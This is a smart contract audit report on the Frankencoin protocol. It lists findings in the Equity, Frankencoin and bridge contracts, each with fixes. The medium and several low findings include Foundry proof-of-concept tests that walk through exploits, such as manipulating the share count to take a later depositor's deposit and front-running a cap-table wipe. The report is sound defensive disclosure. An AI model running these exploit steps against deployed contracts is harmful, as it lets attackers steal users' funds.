# Frankencoin
The code under review can be found in [2023-04-frankencoin](https://github.com/code-423n4/2023-04-frankencoin).

## Findings Summary

| ID | Description | Severity |
| - | - | - |
| [M-01](#m-01-manipulation-of-total-share-amount-might-cause-future-depositors-to-lose-their-assets) | Manipulation of total share amount might cause future depositors to lose their assets | Medium |
| [M-02](#m-02-incorrect-code-in-restructurecaptable) | Incorrect code in `restructureCapTable()` | Medium |
| [L-01](#l-01-dangerous-implementation-of-restructurecaptable) | Dangerous implementation of `restructureCapTable()` | Low |
| [L-02](#l-02-inconsistency-between-isminter-and-denyminter) | Inconsistency between `isMinter()` and `denyMinter()` | Low |
| [L-03](#l-03-anyone-can-become-a-minter-for-frankencoin-when-totalsupply-is-0) | Anyone can become a minter for Frankencoin when `totalSupply` is 0 | Low |
| [L-04](#l-04-users-have-no-way-of-revoking-their-signatures) | Users have no way of revoking their signatures | Low |
| [L-05](#l-05-min_application_period-should-always-be-more-than-0) | `MIN_APPLICATION_PERIOD` should always be more than 0 | Low |
| [L-06](#l-06-dangerous-assumption-of-stablecoin-peg) | Dangerous assumption of stablecoin peg | Low |
| [L-07](#l-07-minor-inconsistency-with-comment-in-calculateproceeds) | Minor inconsistency with comment in `calculateProceeds()` | Low |
| [L-08](#l-08-users-can-lose-a-significant-amount-of-votes-by-transferring-shares-to-themselves) | Users can lose a significant amount of votes by transferring shares to themselves | Low |
| [L-09](#l-09-one-share-will-always-be-stuck-in-the-equity-contract) | One share will always be stuck in the `Equity` contract | Low |
| [L-10](#l-10-misleading-implementation-of-vote-delegation) | Misleading implementation of vote delegation | Low |
| [N-01](#n-01-_transfer-doesnt-check-that-sender--address0) | `_transfer()` doesn't check that `sender != address(0)` | Non-Critical |
| [N-02](#n-02-correctness-of-_cubicroot) | Correctness of `_cubicRoot()` | Non-Critical |

## [M-01] Manipulation of total share amount might cause future depositors to lose their assets

### Bug Description

In the `Equity` contract, the `calculateSharesInternal()` function is used to determine the amount of shares minted whenever a user deposits Frankencoin:

[Equity.sol#L266-L270](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270)

```solidity
function calculateSharesInternal(uint256 capitalBefore, uint256 investment) internal view returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 newTotalShares = totalShares < 1000 * ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
    return newTotalShares - totalShares;
}
```

Note that the return value is the amount of shares minted to the depositor.

Whenever the total amount of shares is less than `1000e18`, the depositor will receive `1000e18 - totalShares` shares, regardless of how much Frankencoin he has deposited. This functionality exists to mint `1000e18` shares to the first depositor.

However, this is a vulnerability as the total amount of shares can decrease below `1000e18` due to the `redeem()` function, which burns shares:

[Equity.sol#L275-L278](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L275-L278)

```solidity
function redeem(address target, uint256 shares) public returns (uint256) {
    require(canRedeem(msg.sender));
    uint256 proceeds = calculateProceeds(shares);
    _burn(msg.sender, shares);
```

The following check in `calculateProceeds()` only ensures that `totalSupply()` is never below `1e18`:

[Equity.sol#L293](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L293)

```solidity
require(shares + ONE_DEC18 < totalShares, "too many shares"); // make sure there is always at least one share
```

As such, if the total amount of shares decreases below `1000e18`, the next depositor will receive `1000e18 - totalShares` shares instead of an amount of shares proportional to the amount of Frankencoin deposited. This could result in a loss or unfair gain of Frankencoin for the depositor.

### Impact

If the total amount of shares ever drops below `1000e18`, the next depositor will receive a disproportionate amount of shares, resulting in an unfair gain or loss of Frankencoin.

Moreover, by repeatedly redeeming shares, an attacker can force the total share amount remain below `1000e18`, causing all future depositors to lose most of their deposited Frankencoin. 

### Proof of Concept

Consider the following scenario:
- Alice deposits 1000 Frankencoin (`amount = 1000e18`), gaining `1000e18` shares in return.
- After 90 days, Alice is able to redeem her shares.
- Alice calls `redeem()` with `shares = 1` to redeem 1 share:
  - The total amount of shares is now `1000e18 - 1`.
- Bob deposits 1000 Frankencoin (`amount = 1000e18`). In `calculateSharesInternal()`:
  - `totalShares < 1000 * ONE_DEC18` evalutes to true.
  - Bob receives `newTotalShares - totalShares = 1000e18 - (1000e18 - 1) = 1` shares.

Although Bob deposited 1000 Frankencoin, he received only 1 share in return. As such, all his deposited Frankencoin can be redeemed by Alice using her shares. Furthermore, Alice can cause the next depositor after Bob to also receive 1 share by redeeming 1 share, causing the total amount of shares to become `1000e18 - 1` again.

Note that the attack described above is possbile as long as an attacker has sufficient shares to decrease the total share amount below `1000e18`.

The following Foundry test demonstrates the scenario above:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/Frankencoin.sol";

contract ShareManipulation_POC is Test {
    Frankencoin zchf;
    Equity reserve;

    address ALICE = address(0x1);
    address BOB = address(0x2);

    function setUp() public {
        // Setup contracts
        zchf = new Frankencoin(10 days);
        reserve = Equity(address(zchf.reserve()));

        // Give both ALICE and BOB 1000 Frankencoin
        zchf.suggestMinter(address(this), 0, 0, "");
        zchf.mint(ALICE, 1000 ether);
        zchf.mint(BOB, 1000 ether);
    }

    function test_NextDepositorGetsOneShare() public {
        // ALICE deposits 1000 Frankencoin, getting 1000e18 shares
        vm.prank(ALICE);
        zchf.transferAndCall(address(reserve), 1000 ether, "");

        // Time passes until ALICE can redeem
        vm.roll(block.number + 90 * 7200);

        // ALICE redeems 1 share, leaving 1000e18 - 1 shares remaining
        vm.prank(ALICE);
        reserve.redeem(ALICE, 1);

        // BOB deposits 1000 Frankencoin, but gets only 1 share
        vm.prank(BOB);
        zchf.transferAndCall(address(reserve), 1000 ether, "");
        assertEq(reserve.balanceOf(BOB), 1);

        // All of BOB's deposited Frankencoin accrue to ALICE
        vm.startPrank(ALICE);
        reserve.redeem(ALICE, reserve.balanceOf(ALICE) - 1e18);
        assertGt(zchf.balanceOf(ALICE), 1999 ether);
    }
}
```

### Recommendation

As the total amount of shares will never be less than `1e18`, check if `totalShares` is less than `1e18` instead of `1000e18` in `calculateSharesInternal()`:

[Equity.sol#L266-L270](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270)

```diff
    function calculateSharesInternal(uint256 capitalBefore, uint256 investment) internal view returns (uint256) {
        uint256 totalShares = totalSupply();
-           uint256 newTotalShares = totalShares < 1000 * ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
+           uint256 newTotalShares = totalShares < ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
        return newTotalShares - totalShares;
   }
```

This would give `1000e18` shares to the initial depositor and ensure that subsequent depositors will never receive a disproportionate amount of shares.

## [M-02] Incorrect code in `restructureCapTable()`
_This issue was upgraded from Low to Medium_

In [`Equity.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol), the `restructureCapTable()` function contains an error:

[Equity.sol#L309-L316](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L309-L316)

```solidity
function restructureCapTable(address[] calldata helpers, address[] calldata addressesToWipe) public {
    require(zchf.equity() < MINIMUM_EQUITY);
    checkQualified(msg.sender, helpers);
    for (uint256 i = 0; i<addressesToWipe.length; i++){
        address current = addressesToWipe[0]; // @audit Should be addressesToWipe[i]
        _burn(current, balanceOf(current));
    }
}
```

## [L-01] Dangerous implementation of `restructureCapTable()`
_This issue was downgraded from Medium to Low_

### Bug Description

In the `Equity` contract, the `restructureCapTable()` function is as follows:

[Equity.sol#L299-L316](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L299-L316)

```solidity
/**
* If there is less than 1000 ZCHF in equity left (maybe even negative), the system is at risk
* and we should allow qualified FPS holders to restructure the system.
*
* Example: there was a devastating loss and equity stands at -1'000'000. Most shareholders have lost hope in the
* Frankencoin system except for a group of small FPS holders who still believes in it and is willing to provide
* 2'000'000 ZCHF to save it. These brave souls are essentially donating 1'000'000 to the minter reserve and it
* would be wrong to force them to share the other million with the passive FPS holders. Instead, they will get
* the possibility to bootstrap the system again owning 100% of all FPS shares.
*/
function restructureCapTable(address[] calldata helpers, address[] calldata addressesToWipe) public {
    require(zchf.equity() < MINIMUM_EQUITY);
    checkQualified(msg.sender, helpers);
    for (uint256 i = 0; i<addressesToWipe.length; i++){
        address current = addressesToWipe[0];
        _burn(current, balanceOf(current));
    }
}
```

As seen from above, whenever `zchf.equity() < MINIMUM_EQUITY`, any user with sufficient votes (more than 3% of total votes) can call `restructureCapTable()` to burn all the shares of other users.

`restructureCapTable()` is meant to be called by a user that will deposit Frankencoin to bring `zchf.equity()` back above `MINIMUM_EQUITY`. However, its current implementation allows it to be called by any user with sufficient votes without depositing any Frankencoin to restructure the system, which is extremely dangerous.

An attacker can exploit this to keep his shares whenever the protocol's equity drops below `MINIMUM_EQUITY`:
- Initially, three users deposit Frankencoin into the `Equity` contract:
  - Alice deposits 1000 Frankencoin (`amount = 1000e18`).
  - Both Bob and Charles deposit 400 Frankencoin (`amount = 400e18`) each.
- After 90 days, Alice calls `redeem()` to redeem all her shares:
  - `zchf.equity()` becomes `400e18 * 2 = 800e18`
  - Now, `zchf.equity() < MINIMUM_EQUITY` evaluates to true.
- Bob wishes to restructure the system. Thus, he sends two transactions:
  - First, he calls `restructureCapTable()` with Charles's address to burn his shares.
  - He then depossits another 1000 Frankencoin (`amount = 1000e18`).
- Charles sees Bob's transactions in the mempool and front-runs them:
  - He calls `restructureCapTable()` with Bob's address to burn his shares first.
- Charles's transaction executes first, burning all of Bob's shares.
- Afterwards, Bob's transactions execute:
  - His call to `restructureCapTable()` reverts as he now has 0 votes.
  - However, his transaction to deposit 1000 Frankencoin still succeeds.

In the scenario above, even though Bob restructured the system, Charles is still able to keep his shares, thereby stealing a portion of Bob's second deposit.

### Impact

Whenever the protocol's equity drops below the minimum, an attacker can front-run all other qualified users to burn everyone else's shares. By doing so, he is able to keep his shares, thereby stealing a portion of the next deposit.

### Proof of Concept

The following Foundry test demonstrates the scenario described above:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/Frankencoin.sol";

contract restructureCapTable_POC is Test {
    uint256 private constant MINIMUM_EQUITY = 1000e18;

    Frankencoin zchf;
    Equity reserve;

    address ALICE = address(0x1);
    address BOB = address(0x2);
    address CHARLES = address(0x3);

    function setUp() public {
        // Setup contracts
        zchf = new Frankencoin(10 days);
        reserve = Equity(address(zchf.reserve()));

        // Give all users 2000 Frankencoin
        zchf.suggestMinter(address(this), 0, 0, "");
        zchf.mint(ALICE, 2000 ether);
        zchf.mint(BOB, 2000 ether);
        zchf.mint(CHARLES, 2000 ether);
    }

    function test_FrontrunToKeepShares() public {
        // ALICE deposits 1000 Frankencoin
        vm.prank(ALICE);
        zchf.transferAndCall(address(reserve), 1000 ether, "");

        // BOB deposits 400 Frankencoin
        vm.prank(BOB);
        zchf.transferAndCall(address(reserve), 400 ether, "");

        // CHARLES deposits 400 Frankencoin
        vm.prank(CHARLES);
        zchf.transferAndCall(address(reserve), 400 ether, "");

        // 90 days pass
        vm.roll(block.number + 90 days / 12);

        // ALICE redeems all her shares
        uint256 shares = reserve.balanceOf(ALICE);
        vm.prank(ALICE);
        reserve.redeem(ALICE, shares);

        // Reserve equity is now below minimum
        assertLt(zchf.equity(), MINIMUM_EQUITY);

        // CHARLES front-runs BOB's transactions, burning his shares first
        address[] memory addressesToWipe = new address[](1);
        addressesToWipe[0] = BOB;
        vm.prank(CHARLES);
        reserve.restructureCapTable(new address[](0), addressesToWipe);

        // BOB now has 0 shares
        assertEq(reserve.balanceOf(BOB), 0);

        // BOB's transaction burn CHARLES's shares reverts
        vm.startPrank(BOB);
        addressesToWipe[0] = CHARLES;
        vm.expectRevert();
        reserve.restructureCapTable(new address[](0), addressesToWipe);

        // However, BOB's transaction to deposit Frankencoin succeeds
        zchf.transferAndCall(address(reserve), 1000 ether, "");
        vm.stopPrank();
    }
}
```

### Recommendation

Ensure that only the user who deposits Frankencoin to restructure the system can call `restructureCapTable()`. For example, refactor `restructureCapTable()` to make the caller deposit sufficient Frankencoin:

```solidity
function restructureCapTable(uint256 amount, address[] calldata helpers, address[] calldata addressesToWipe) public {
    uint256 equity = zchf.equity();
    require(equity < MINIMUM_EQUITY);
    require(equity + amount >= MINIMUM_EQUITY, "insuf equity");
    checkQualified(msg.sender, helpers);

    zchf.transferFrom(msg.sender, address(this), amount);
    uint256 shares = equity <= amount ? 1000 * ONE_DEC18 : calculateSharesInternal(equity - amount, amount);
    _mint(from, shares);

    for (uint256 i = 0; i<addressesToWipe.length; i++){
        address current = addressesToWipe[i];
        _burn(current, balanceOf(current));
    }
}
```

In the above implementation, the caller is only able to burn everyone else's shares after depositing Frankencoin to restructure the system. Moreover, since `restructureCapTable()` can only be called by the user that restructures the system, the following check:
```solidity
checkQualified(msg.sender, helpers);
```
is not needed and can be removed to allow anyone to restructure the system, regardless of votes.

## [L-02] Inconsistency between `isMinter()` and `denyMinter()`
_This issue was downgraded from Medium to Low_

### Bug Description

The `Frankencoin` contract determines if users are valid minters using the `isMinter()` function:

[Frankencoin.sol#L290-L295](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L290-L295)

```solidity
/**
* Returns true if the address is an approved minter.
*/
function isMinter(address _minter) override public view returns (bool){
    return minters[_minter] != 0 && block.timestamp >= minters[_minter];
}
```

A user is a valid minter if `block.timestamp` is greater than **or equal to** `minters[user]`.

This is inconsistent with the `denyMinter()` function, which can be called by vetoers to prevent suggested users from becoming minters:

[Frankencoin.sol#L148-L157](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L148-L157)

```solidity
/**
* Qualified pool share holders can deny minters during the application period.
* Calling this function is relatively cheap thanks to the deletion of a storage slot.
*/
function denyMinter(address _minter, address[] calldata _helpers, string calldata _message) override external {
    if (block.timestamp > minters[_minter]) revert TooLate();
    // Code to prevent _minter from becoming a valid minter
}
```

As seen from above, `denyMinter()` can be called as long as `block.timestamp` is less than **or equal to** `minters[user]`.

Therefore, when `minters[user] == block.timestamp`, `denyMinter()` still works although `isMinter()` returns true.

### Impact

If a suggested user is vetoed at literally the last second (`block.timestamp == minters[user]`), the user might still be able to call minter functions, such as `mint()` or `burnFrom()`.

### Proof of Concept

Consider the following scenario:
- Alice calls `suggestMinter()` with `_applicationPeriod = 10 days` to suggest herself as minter.
- 10 days pass, until `minters[alice] == block.timestamp`. During this period, no one has called `denyMinter()` to veto Alice's suggestion.
- Bob, a vetoer with sufficient votes, calls `denyMinter()` at the last second to prevent Alice from becoming a minter.
- Alice front-runs Bob's transaction, calling `mint()` to mint Frankencoin for herself.
- If Alice's transaction is executed before Bob's transaction in the same block, her call to `mint()` will succeed.

The following Foundry test demonstrates the scenario above:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/Frankencoin.sol";

contract denyMinter_POC is Test {
    uint256 constant MIN_APPLICATION_PERIOD = 10 days;

    Frankencoin zchf;
    Equity reserve;

    address ALICE = address(0x1);
    address BOB = address(0x2);

    function setUp() public {
        // Setup contracts
        zchf = new Frankencoin(MIN_APPLICATION_PERIOD);
        reserve = Equity(address(zchf.reserve()));

        // Make BOB a valid vetoer
        vm.startPrank(BOB);
        zchf.suggestMinter(BOB, 0, 0, "");
        zchf.mint(BOB, 1000 ether);
        zchf.transferAndCall(address(reserve), 1000 ether, "");
        vm.stopPrank();

        // Give ALICE 1000 Frankencoin
        deal(address(zchf), ALICE, 1000 ether);
    }

    function test_denyMinterIsInconsistent() public {
        // BOB is a valid vetoer       
        reserve.checkQualified(BOB, new address[](0));

        // ALICE suggests herself as minter
        vm.startPrank(ALICE);
        zchf.suggestMinter(ALICE, MIN_APPLICATION_PERIOD, zchf.MIN_FEE(), "");

        // No one vetoes ALICE until minters[ALICE] == block.timestamp
        skip(MIN_APPLICATION_PERIOD);
        assertEq(zchf.minters(ALICE), block.timestamp);

        // ALICE is now a minter and can call minterOnly functions
        assertTrue(zchf.isMinter(ALICE));
        zchf.mint(ALICE, 1000 ether);
        vm.stopPrank();

        // However, BOB can still veto ALICE using denyMinter()
        vm.prank(BOB);
        zchf.denyMinter(ALICE, new address[](0), "");

        // Now, ALICE is no longer a minter
        assertFalse(zchf.isMinter(ALICE));
    }
}
```

### Recommendation

Change `denyMinter()` to also revert when `block.timestamp == minters[_minter]`:

[Frankencoin.sol#L152-L153](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L152-L153)

```diff
function denyMinter(address _minter, address[] calldata _helpers, string calldata _message) override external {
-       if (block.timestamp > minters[_minter]) revert TooLate();
+       if (block.timestamp >= minters[_minter]) revert TooLate();
```

Alternatively, make suggested users become minters only after `minters[_minter]` has passed:

[Frankencoin.sol#L293-L295](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L293-L295)

```diff
function isMinter(address _minter) override public view returns (bool){
-       return minters[_minter] != 0 && block.timestamp >= minters[_minter];
+       return minters[_minter] != 0 && block.timestamp > minters[_minter];
}
```

## [L-03] Anyone can become a minter for Frankencoin when `totalSupply` is 0
_This issue was downgraded from Medium to Low_

### Bug Description

In the `Frankencoin` contract, anyone can call the `suggestMinter()` function to propose a new minter:

[Frankencoin.sol#L83-L90](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L83-L90)

```solidity
function suggestMinter(address _minter, uint256 _applicationPeriod, uint256 _applicationFee, string calldata _message) override external {
    if (_applicationPeriod < MIN_APPLICATION_PERIOD && totalSupply() > 0) revert PeriodTooShort();
    if (_applicationFee < MIN_FEE  && totalSupply() > 0) revert FeeTooLow();
    if (minters[_minter] != 0) revert AlreadyRegistered();
    _transfer(msg.sender, address(reserve), _applicationFee);
    minters[_minter] = block.timestamp + _applicationPeriod;
    emit MinterApplied(_minter, _applicationPeriod, _applicationFee, _message);
}
```

Suggested users become an approved minter when the application period has passed, as seen in the `isMinter()` function:

[Frankencoin.sol#L290-L295](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L290-L295)

```solidity
/**
* Returns true if the address is an approved minter.
*/
function isMinter(address _minter) override public view returns (bool){
    return minters[_minter] != 0 && block.timestamp >= minters[_minter];
}
```

The issue lies in the following check in `suggestMinter()`:
```solidity
if (_applicationPeriod < MIN_APPLICATION_PERIOD && totalSupply() > 0) revert PeriodTooShort();
```

As the check above always passes when Frankencoin's total supply is 0, an attacker can call `suggestMinter()` with `_applicationPeriod = 0` to instantly become an approved minter, allowing him to call minter functions.

### Impact

Whenever Frankencoin's total supply is 0, a malicious attacker can instantly become an approved minter and call sensitive functions, such as `mint()` or `burnFrom()`.

Additionally, this implementation is potentially vulnerable to front-running during deployment. If the deployer is meant to call `suggestMinter()` and then mint Frankencoin when the contract is first deployed, an attacker can front-run the deployer's transaction with his own call to `suggestMinter()` to become an approved minter first.

### Recommendation

In the `suggestMinter()` function, remove the `totalSupply() > 0` condition in both checks:

[Frankencoin.sol#L83-L85](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L83-L85)

```diff
function suggestMinter(address _minter, uint256 _applicationPeriod, uint256 _applicationFee, string calldata _message) override external {
-       if (_applicationPeriod < MIN_APPLICATION_PERIOD && totalSupply() > 0) revert PeriodTooShort();
-       if (_applicationFee < MIN_FEE  && totalSupply() > 0) revert FeeTooLow();
+       if (_applicationPeriod < MIN_APPLICATION_PERIOD) revert PeriodTooShort();
+       if (_applicationFee < MIN_FEE) revert FeeTooLow();
```

If this functionality exists to assign a trusted address as minter during deployment, consider assigning the trusted address as minter in the constructor instead:

[Frankencoin.sol#L59-L62](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L59-L62)

```diff
-   constructor(uint256 _minApplicationPeriod) ERC20(18){
+   constructor(uint256 _minApplicationPeriod, address _minter) ERC20(18){
        MIN_APPLICATION_PERIOD = _minApplicationPeriod;
        reserve = new Equity(this);
+       minters[_minter] = block.timestamp;
}
```

## [L-04] Users have no way of revoking their signatures

In [`ERC20PermitLight.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/ERC20PermitLight.sol), users can use signatures to approve other users as spenders. Spenders will then use the `permit()` function to verify the signature and gain allowance.

Currently, users have no way of revoking their signatures once it is signed. This could result in a misuse of approvals:
- Alice provides a signature to approve Bob to spend 100 tokens.
- Before `deadline` is passed, Bob's account is hacked.
- As Alice has no way of revoking the signature, Bob's account uses the signature to approve and spend Alice's tokens.

### Recommendation

Implement a way for users to revoke their own signatures, such as a function that increments the nonce of `msg.sender` when called:

```solidity
function incrementNonce() public {
    nonces[msg.sender]++;
}
```

## [L-05] `MIN_APPLICATION_PERIOD` should always be more than 0

In [`Frankencoin.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol), if `MIN_APPLICATION_PERIOD` is ever set to 0, anyone can call [`suggestMinter()`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L72-L90) with `_applicationPeriod = 0`, instantly becoming a minter. They will then be able to call sensitive minter functions, such as [`mint()`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L161-L174).

### Recommendation

Ensure that `MIN_APPLICATION_PERIOD` is never set to 0. This can be done in the constructor:

[Frankencoin.sol#L59-L62](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L59-L62)

```diff
    constructor(uint256 _minApplicationPeriod) ERC20(18){
+       require(_minApplicationPeriod != 0, "MIN_APPLICATION_PERIOD cannot be 0");
        MIN_APPLICATION_PERIOD = _minApplicationPeriod;
        reserve = new Equity(this);
    }
```

## [L-06] Dangerous assumption of stablecoin peg

In [`StablecoinBridge.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/StablecoinBridge.sol), users can deposit a chosen stablecoin in exchange for Frankencoin:

[StablecoinBridge.sol#L40-L53](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/StablecoinBridge.sol#L40-L53)

```solidity
/**
* Mint the target amount of Frankencoins, taking the equal amount of source coins from the sender.
* This only works if an allowance for the source coins has been set and the caller has enough of them.
*/
function mint(address target, uint256 amount) public {
    chf.transferFrom(msg.sender, address(this), amount);
    mintInternal(target, amount);
}

function mintInternal(address target, uint256 amount) internal {
    require(block.timestamp <= horizon, "expired");
    require(chf.balanceOf(address(this)) <= limit, "limit");
    zchf.mint(target, amount);
}
```

Where:
- `chf` - Address of the input stablecoin contract.
- `zchf` - Address of Frankencoin contract. 

This implementation assumes that the input stablecoin will always have a 1:1 value with Frankencoin. However, in the unlikely situation that the input stablecoin depegs, users can use this stablecoin bridge to mint Frankencoin at a discount, thereby harming the protocol.

### Recommendation

Use a price oracle to ensure the input stablecoin price is acceptable. Alternatively, implement some method for a trusted user to intervene, such as allowing a trusted user to pause minting in the event the input stablecoin depegs.

## [L-07] Minor inconsistency with comment in `calculateProceeds()`

In [`Equity.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol), the `calculateProceeds()` function is as shown:

[Equity.sol#L290-L297](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L290-L297)

```solidity
function calculateProceeds(uint256 shares) public view returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 capital = zchf.equity();
    require(shares + ONE_DEC18 < totalShares, "too many shares"); // make sure there is always at least one share
    uint256 newTotalShares = totalShares - shares;
    uint256 newCapital = _mulD18(capital, _power3(_divD18(newTotalShares, totalShares)));
    return capital - newCapital;
}
```

The comment states that a minimum of one share (`ONE_DEC18`) must remain in the contract. However, the require statement actually ensures that `totalShares` is never below `ONE_DEC18 + 1`. 

### Recommendation

Change the require statement to the following:

```solidity
require(totalShares - shares >= ONE_DEC18, "too many shares"); // make sure there is always at least one share
```

## [L-08] Users can lose a significant amount of votes by transferring shares to themselves 

In [`Equity.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol), `adjustRecipientVoteAnchor()` is called by the `_beforeTokenTransfer()` hook to adjust a recevier's `voteAnchor`:

[Equity.sol#L150-L167](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L150-L167)

```solidity
/**
* @notice the vote anchor of the recipient is moved forward such that the number of calculated
* votes does not change despite the higher balance.
* @param to        receiver address
* @param amount    amount to be received
* @return the number of votes lost due to rounding errors
*/
function adjustRecipientVoteAnchor(address to, uint256 amount) internal returns (uint256){
    if (to != address(0x0)) {
        uint256 recipientVotes = votes(to); // for example 21 if 7 shares were held for 3 blocks
        uint256 newbalance = balanceOf(to) + amount; // for example 11 if 4 shares are added
        voteAnchor[to] = uint64(anchorTime() - recipientVotes / newbalance); // new example anchor is only 21 / 11 = 1 block in the past
        return recipientVotes % newbalance; // we have lost 21 % 11 = 10 votes
    } else {
        // optimization for burn, vote anchor of null address does not matter
        return 0;
    }
}
```

The function is used to ensure a user has the same amount of votes before and after a transfer of shares. 

However, if a user transfers all his shares to himself, `newBalance` will be two times of his actual balance, causing his `voteAnchor` to become larger than intended. Therefore, he will lose a significant amount of votes.

### Recommendation

Make the following change to the `_beforeTokenTransfer()` hook:

[Equity.sol#L112-L114](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L112-L114)

```diff
    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal {
        super._beforeTokenTransfer(from, to, amount);
-       if (amount > 0){
+       if (amount > 0 && from != to){
```

This ensures users do not lose votes in the unlikely event where they transfer shares to themselves.

## [L-09] One share will always be stuck in the `Equity` contract

In `Equity.sol`, the following require statement ensures that the last share can never be redeemed from the contract:

[Equity.sol#L293](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L293)

```solidity
require(shares + ONE_DEC18 < totalShares, "too many shares"); // make sure there is always at least one share
```

In the unlikely event where everyone wants to redeem their shares, the last redeemer will never be able to redeem his last share. Therefore, he will always have some Frankencoin stuck in the contract.

## [L-10] Misleading implementation of vote delegation

In [`Equity.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol), users can delegate their votes to a delegatee using the [`delegateVoteTo()`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L216-L223) function.

The `canVoteFor()` function is then used to check if `delegate` is a delegatee of `owner`:

[Equity.sol#L225-L233](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L225-L233)

```solidity
function canVoteFor(address delegate, address owner) internal view returns (bool) {
    if (owner == delegate){
        return true;
    } else if (owner == address(0x0)){
        return false;
    } else {
        return canVoteFor(delegate, delegates[owner]);
    }
}
```

However, due to its recursive implementation, delegations can be chained to combine the votes of multiple users, similar to a linked list. For example:

- Alice's delegatee is Bob.
- Bob's delegatee is Charlie.

Due to the chained delegation, Charlie's voting power is increased by the votes of both Alice and Bob.

This becomes an issue if Alice wishes to delegate votes to **only** Bob, and no one else. Once she sets Bob as her delegatee, Bob's delegatee will also gain voting power from her votes; Alice has no control over this.

### Recommendation

Consider removing this chained delegation functionality in `canVoteFor()`:

```solidity
function canVoteFor(address delegate, address owner) internal view returns (bool) {
    return owner == delegate;
}
```

## [N-01] `_transfer()` doesn't check that `sender != address(0)`

In [`ERC20.sol`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/ERC20.sol), the `_transfer()` function does not ensure that the `sender` is not  `address(0)`:

[ERC20.sol#L151-L152](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/ERC20.sol#L151-L152)

```solidity
function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(recipient != address(0));
```

This differs from [OpenZeppelin's ERC20 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L222-L224).

### Recommendation 

Add the following check to `_transfer()`:

[ERC20.sol#L151-L152](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/ERC20.sol#L151-L152)

```diff
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+       require(sender != address(0));
        require(recipient != address(0));
```

## [N-02] Correctness of `_cubicRoot()`

The following Foundry fuzz test can be used to verify the correctness of the [`_cubicRoot()`](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MathUtil.sol#L12-L29) function:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/MathUtil.sol";

contract MathUtilTest is Test, MathUtil {
    function testFuzz_cubicRoot(uint256 v) public {
        v = bound(v, ONE_DEC18, 38597363079105398489064286242003304715461606497555392182630);
        uint256 result = _power3(_cubicRoot(v));
        if (result != v) {
            uint256 err = v > result ? v - result : result - v;
            assertLt(err * 1e8, v);
        } 
    }
}
```

The test proves that `_cubicRoot()` has a margin of error below 0.000001% when `_v >= 1e18`.

Additionally, the function has the following limitations:
- `_cubicRoot()` reverts if `_v` is greater than `38597363079105398489064286242003304715461606497555392182630`.
- `_cubicRoot()` is incorrect for extremely small values of `_v`. For example:
  - `_cubicRoot(0)` returns `7812500000000000`.
  - `_cubicRoot(1)` returns `7812500000003509`.

Nevertheless, these limitations do not pose any issue in the current implementation of the protocol.